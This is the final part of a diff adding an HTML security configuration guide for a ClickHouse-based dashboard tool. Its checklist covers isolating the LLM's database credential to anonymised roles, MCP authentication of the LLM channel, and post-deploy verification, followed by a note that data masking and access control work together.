+        <td>CREATE USER bentoclick_llm</td>
+        <td><span class="check-warn">&#9744; Planned hardening</span></td>
+      </tr>
+      <tr>
+        <td><span class="pill pill-amber">P6</span></td>
+        <td>bentoclick_llm holds ONLY anon roles — no real-data grants</td>
+        <td>GRANT anon_* only; REVOKE all else</td>
+        <td><span class="check-warn">&#9744; Planned hardening</span></td>
+      </tr>
+      <tr>
+        <td><span class="pill pill-amber">P6</span></td>
+        <td>MCP authenticates LLM channel as bentoclick_llm (not human JWT)</td>
+        <td>mcp-values.yaml auth.username override</td>
+        <td><span class="check-warn">&#9744; Planned hardening</span></td>
+      </tr>
+      <tr>
+        <td><span class="pill pill-amber">P6</span></td>
+        <td>owner_override stamping in dashboards_mv (with JWT validation)</td>
+        <td>MV definer logic + MCP JWT claim check</td>
+        <td><span class="check-warn">&#9744; Planned hardening</span></td>
+      </tr>
+      <tr>
+        <td><span class="pill pill-blue">Both</span></td>
+        <td>Verify all controls with test queries (see sections above)</td>
+        <td>Manual / CI integration test</td>
+        <td><span class="check-warn">&#9744; Verify after each deploy</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <div class="callout success">
+    <strong>Reminder:</strong> tokenized masked sandboxing protects the LLM from seeing real
+    identifiers during authoring — it is not a substitute for access control on the viewer path
+    (P5) or isolation of the LLM credential (P6). Both controls are complementary; neither alone
+    is sufficient.
+  </div>
+
+  <footer>
+    bentoclick security configuration guide &mdash; for ClickHouse 26.x RBAC &mdash;
+    not a guarantee of security; review with your infrastructure team before production deployment
+  </footer>
+
+</div>
+</body>
+</html>
